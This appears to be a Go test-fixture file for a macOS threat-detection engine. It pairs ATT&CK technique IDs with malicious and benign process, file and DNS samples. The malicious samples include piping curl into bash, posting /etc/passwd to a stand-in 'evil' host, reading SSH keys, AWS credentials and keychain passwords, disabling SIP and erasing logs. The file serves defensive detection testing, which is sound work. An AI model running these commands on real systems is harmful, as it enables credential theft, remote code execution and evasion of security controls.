package api

// macOS fixtures.

func init() {
	sigFixtures = append(sigFixtures, []sigFixture{
		{"M-T1059.002a", fxProc("osascript", `osascript -e 'do shell script "id" with administrator privileges'`), fxProc("osascript", "osascript /Users/a/script.scpt.txt")},
		{"M-T1059.002b", fxProc("osascript", `osascript -e 'display dialog "Enter password" default answer ""'`), fxProc("osascript", "osascript -l JavaScript x.js")},
		{"M-T1059.004", fxProc("bash", "bash -c curl https://x/a.sh | bash"), fxProc("ssh", "ssh https://example.com")},
		{"M-T1059.004b", fxProc("payload", "/tmp/payload"), fxProc("ls", "ls -l /Users/a")},
		{"M-T1105", fxProc("curl", "curl https://x/a.sh | bash"), fxProc("curl", "curl https://example.com/api")},
		{"M-T1218.001", fxProc("osascript", "osascript /tmp/x.scpt"), fxProc("osascript", "osascript -l JavaScript x.js")},
		{"M-T1087.001", fxProc("dscl", "dscl . list /users"), fxProc("dscl", "dscl . read /Users/a")},
		{"M-T1082", fxProc("system_profiler", "system_profiler SPHardwareDataType"), fxProc("ls", "ls -l")},
		{"M-T1046", fxProc("nmap", "nmap -sS 10.0.0.0/24"), fxProc("ls", "ls -l")},
		{"M-T1592", fxProc("tcpdump", "tcpdump -i en0"), fxProc("ls", "ls -l")},
		{"M-T1548.001", fxProc("chmod", "chmod u+s /tmp/x"), fxProc("chmod", "chmod 644 /tmp/x")},
		{"M-T1548.004", fxProc("sudo", "sudo su"), fxProc("sudo", "sudo softwareupdate -l")},
		{"M-T1553.001", fxProc("xattr", "xattr -d com.apple.quarantine /tmp/app"), fxProc("xattr", "xattr -l file.txt")},
		{"M-T1562.001", fxProc("csrutil", "csrutil disable"), fxProc("csrutil", "csrutil status")},
		{"M-T1555.001a", fxProc("security", "security find-generic-password -s Chrome"), fxProc("security", "security list-keychains")},
		{"M-T1555.001b", fxFile("/Users/a/Library/Keychains/login.keychain-db"), fxFile("/Users/a/Documents/x.txt")},
		{"M-T1110.001", fxLogonMsg("Failed password for root from 1.2.3.4"), fxLogonMsg("Accepted publickey for deploy")},
		{"M-T1552.004", fxProc("cat", "cat /Users/a/.ssh/id_rsa"), fxProc("cat", "cat /Users/a/notes.txt")},
		{"M-T1552.005", fxProc("cat", "cat /Users/a/.aws/credentials"), fxProc("cat", "cat /Users/a/notes.txt")},
		{"M-T1543.004", fxFile("/Library/LaunchDaemons/evil.plist"), fxFile("/Library/Preferences/x.plist")},
		{"M-T1546.004", fxFile("/Users/a/.zshrc"), fxFile("/Users/a/notes.txt")},
		{"M-T1547.015", fxProc("defaults", "defaults write com.apple.loginwindow LoginHook /tmp/x.sh"), fxProc("defaults", "defaults read NSGlobalDomain")},
		{"M-T1053.003", fxFile("/etc/crontab"), fxFile("/etc/hosts")},
		{"M-T1070.002", fxProc("log", "log erase --all"), fxProc("log", "log show --last 1h")},
		{"M-T1574.006", fxProc("sh", "DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls"), fxProc("ls", "ls -l")},
		{"M-T1021.004", fxProc("ssh", "ssh -R 8080:localhost:80 jump"), fxProc("sshd", "/usr/sbin/sshd -d")},
		{"M-T1572", fxDNSEvent("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.evil.com"), fxDNSEvent("www.example.com")},
		{"M-T1219", fxProc("anydesk", "anydesk --start"), fxProc("ls", "ls -l")},
		{"M-T1048", fxProc("curl", "curl -X POST -d @/etc/passwd http://evil"), fxProc("curl", "curl https://example.com")},
		{"M-T1560", fxProc("tar", "tar czf /tmp/h.tgz /Users/a/Documents"), fxProc("start-stop-daemon", "start-stop-daemon --start backup")},
		{"M-T1090.003", fxProc("proxychains", "proxychains nmap x"), fxProc("monitord", "monitord --check")},
	}...)
}
